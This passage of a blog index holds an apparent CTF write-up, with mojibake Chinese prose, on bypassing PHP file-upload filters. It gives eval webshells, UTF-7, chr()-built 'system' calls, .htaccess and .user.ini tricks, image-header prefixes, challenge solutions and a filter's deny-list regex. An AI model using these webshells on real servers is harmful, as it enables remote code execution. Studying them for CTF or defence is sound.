class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure><blockquote><?php @eval($_POST['cmd']);?></blockquote><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><p>å‡å¦‚å¯¹ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ä¸­çš„phpï¼ŒPOSTï¼Œevalæ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨è¿™æ ·çš„æ–¹å¼ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>pphphp</span><br><span class="line">@eevalval($_PPOSTOST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></blockquote><h3 id="user-iniç»•è¿‡"><a href="#user-iniç»•è¿‡" class="headerlink" title=".user.iniç»•è¿‡"></a>.user.iniç»•è¿‡</h3><p>å‡å¦‚<code>.htaccess</code>è¢«è¿‡æ»¤äº†ï¼Œä¸å…è®¸ä¸Šä¼ ï¼Œè€Œä¸Šä¼ ç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œåˆ™å¯ä»¥ä½¿ç”¨.user.iniå°†æˆ‘ä»¬åˆ¶å®šæ–‡ä»¶åŒ…å«åˆ°æˆ‘ä»¬ç›®å½•ä¸‹çš„æ‰€æœ‰PHPæ–‡ä»¶å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><ul><li>1.aaa</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><ul><li>.user.ini</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure><blockquote><p>åŠ è½½å…¶å®ƒphpæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå…ˆåŠ è½½<code>.user.ini</code>é‡Œçš„<code>1.aaa</code></p></blockquote><h3 id="htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡"><a href="#htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡" class="headerlink" title=".htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡"></a>.htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡</h3><p>ä¸Šä¼ .htaccessæ–‡ä»¶æ—¶å€™å‘ç°æ–‡ä»¶å†…å®¹è¢«è¿‡æ»¤ã€‚å¯ä»¥ä½¿ç”¨æ¢è¡Œç»•è¿‡çš„æ–¹æ³•ç»•è¿‡è¿‡æ»¤ã€‚</p><p>.htaccessæ”¯æŒæ¢è¡Œç¼–å†™æ‰€ä»¥ä½¿ç”¨æ¢è¡Œå¯ä»¥ç›´æ¥ä¸Šä¼ æˆåŠŸå¹¶è§£æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><blockquote><p>è¿‡æ»¤æ‰applicationï¼Œåˆ™ä½¿ç”¨æ¢è¡Œç»•è¿‡</p></blockquote><h3 id="æ–‡ä»¶åŒ…å«è§£ç Base64"><a href="#æ–‡ä»¶åŒ…å«è§£ç Base64" class="headerlink" title="æ–‡ä»¶åŒ…å«è§£ç Base64"></a>æ–‡ä»¶åŒ…å«è§£ç Base64</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;</span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€æ‹¼æ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤"><a href="#åŠ¨æ€æ‹¼æ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤" class="headerlink" title="åŠ¨æ€æ‹¼æ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤"></a>åŠ¨æ€æ‹¼æ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤</h3><p>å¯¹å±é™©å‡½æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸å…è®¸ä¸Šä¼ ï¼Œåˆ™å¯ä»¥ä½¿ç”¨aiiscç æ‹¼æ¥åŠ¨æ€æ„é€ å‡½æ•°æ¥ç»•è¿‡ã€‚</p><p>ä½¿ç”¨è„šæœ¬å¿«é€Ÿç”ŸæˆæŒ‡å®šå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;chr(&quot;</span>.ord($a[$i]).<span class="string">&quot;).&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111)</p><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="å›¾ç‰‡å¤´ç»•è¿‡"><a href="#å›¾ç‰‡å¤´ç»•è¿‡" class="headerlink" title="å›¾ç‰‡å¤´ç»•è¿‡"></a>å›¾ç‰‡å¤´ç»•è¿‡</h3><p>ä¸Šä¼ 1.aaaï¼Œè¢«æ£€æµ‹åˆ°æ–‡ä»¶ä¸æ˜¯å›¾ç‰‡ç±»å‹ï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼Œåˆ™æœ‰å¯èƒ½è¢«è¯†åˆ«ä¸ºå›¾ç‰‡ï¼Œç»•è¿‡æ£€æµ‹ã€‚</p><h4 id="XMBæ–‡ä»¶å¤´ç»•è¿‡"><a href="#XMBæ–‡ä»¶å¤´ç»•è¿‡" class="headerlink" title="XMBæ–‡ä»¶å¤´ç»•è¿‡"></a>XMBæ–‡ä»¶å¤´ç»•è¿‡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h3><p>å‘ç°ä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å†…å®¹ä¸èƒ½ä½¿ç”¨å®˜æ–¹é»˜è®¤é£æ ¼(ä¸Šä¼ æç¤ºï¼šCanâ€™t upload php file)ï¼Œæ‰€ä»¥å°è¯•ä½¿ç”¨å…¶å®ƒæ ‡ç­¾ç»•è¿‡</p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagã€‚</p><p><img src="https://s1.ax1x.com/2020/08/10/abJwIH.png" alt="abJwIH.png"></p><blockquote><p>æˆ–è€…</p><p>cat /flag</p><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100628.png" alt="å¾®ä¿¡æˆªå›¾_20200716100628"></p></blockquote><h3 id="upload3"><a href="#upload3" class="headerlink" title="upload3"></a>upload3</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>å‘ç°phpï¼Œevalï¼ŒPOSTè¢«æ›¿æ¢ä¸ºç©ºï¼Œä½¿ç”¨åŒå†™ç»•è¿‡ã€‚</p><p><img src="https://s1.ax1x.com/2020/08/10/abYTtH.png" alt="abYTtH.png"></p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><h3 id="upload4"><a href="#upload4" class="headerlink" title="upload4"></a>upload4</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/10/abUytg.png" alt="abUytg.png"></p><p>å‘ç°æ²¡æœ‰ä¸Šä¼ ã€‚ä¸Šä¼ test.phpå’Œ1.jpgï¼ˆä¸æ˜¯çœŸçš„jpgæ–‡ä»¶ï¼‰ä¹Ÿéƒ½å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨.user.iniç»•è¿‡ï¼Œç»“æœæç¤ºï¼šå†…å®¹ä¸èƒ½æœ‰fileã€‚</p><p>å‡ æ¬¡å°è¯•åå‘ç°ï¼Œå®ƒå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œä¸èƒ½å«æœ‰<code>&lt;?</code>ï¼Œä¸”æ— æ³•ç”¨å…¶å®ƒæ ‡ç­¾ç»•è¿‡ã€‚</p><p>å°è¯•ä½¿ç”¨ç‰¹æ®Šç¼–ç ç»•è¿‡ï¼Œä¸Šä¼ .htaccesså’Œ1.aaa</p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagã€‚</p><blockquote><p>æ‰¾åˆ°flagä¹‹åæŸ¥çœ‹phpç‰ˆæœ¬ä¸ºï¼š7.0.33</p><p>å°è¯•å‘ç°ï¼š</p><p><img src="https://s1.ax1x.com/2020/08/11/aLcYOU.png" alt="aLcYOU.png"></p><p>ç”±äºç‰ˆæœ¬ä¸º7.0ä»¥ä¸Šä¸”è¿‡æ»¤æ‰<code>&lt;?</code>ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å…¶å®ƒæ ‡ç­¾ç»•è¿‡ã€‚</p></blockquote><h3 id="upload6"><a href="#upload6" class="headerlink" title="upload6"></a>upload6</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>æç¤ºï¼šå†…å®¹ä¸èƒ½æœ‰application</p><p>å°è¯•ä½¿ç”¨.htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡ã€‚</p><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><h3 id="upload7"><a href="#upload7" class="headerlink" title="upload7"></a>upload7</h3><ul><li>.htaccess</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ 1.aaa æç¤ºï¼šä¸èƒ½å«æœ‰å±é™©å‡½æ•°ï¼</p><p>ä½¿ç”¨burp suiteæŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°evalå’ŒPOSTè¢«è¿‡æ»¤äº†ã€‚</p><p>å°è¯•ä½¿ç”¨åŠ¨æ€æ‹¼æ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤ï¼Œå‘ç°å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œç„¶åè®¿é—®è¯¥æ–‡ä»¶å°±å¯ä»¥å¾—åˆ°flagã€‚</p><ul><li>1.aaa</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = chr(<span class="number">115</span>).chr(<span class="number">121</span>).chr(<span class="number">115</span>).chr(<span class="number">116</span>).chr(<span class="number">101</span>).chr(<span class="number">109</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼šsystem</p></blockquote><p>PSï¼š</p><p>ctf-wscanä¸‹è½½åœ°å€ï¼š<a href="https://codeload.github.com/kingkaki/ctf-wscan/zip/master">https://codeload.github.com/kingkaki/ctf-wscan/zip/master</a></p><p>åšé¢˜å‰å¯ä»¥å…ˆæ‰«æ‰«çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶</p><p>åƒ<code>robots.txt </code>ã€<code>www.zip</code>ã€‚</p><ul><li>ä½¿ç”¨æ‰«æå™¨æ‰«æå‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶</li></ul><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232655.png" alt="å¾®ä¿¡æˆªå›¾_20200716232655"></p><ul><li>ä¸‹è½½å¤‡ä»½æ–‡ä»¶</li></ul><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232734.png" alt="å¾®ä¿¡æˆªå›¾_20200716232734"></p><ul><li>æŠŠ<code>.index.php.swp</code>æ”¾åˆ°linuxä¸‹ä½¿ç”¨vim -ræ¢å¤</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><ul><li>å¾—åˆ°æºä»£ç </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;../upload&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>($i=strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">                $c=substr($s,$i,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> $s;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload=<span class="literal">false</span>;</span><br><span class="line">$msg=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext=<span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name=trim($_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name=deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext=strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext=strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext=str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext=trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file=$_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            </span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(phpinfo|system\(|eval\(|file_put_contents|file_get_contents|passthru|exec\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;</span>,file_get_contents($temp_file)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸èƒ½å«æœ‰å±é™©å‡½æ•°ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> $img_path;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        mkdir(UPLOAD_PATH,<span class="number">775</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–æ¼æ´</title>
      <link href="2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
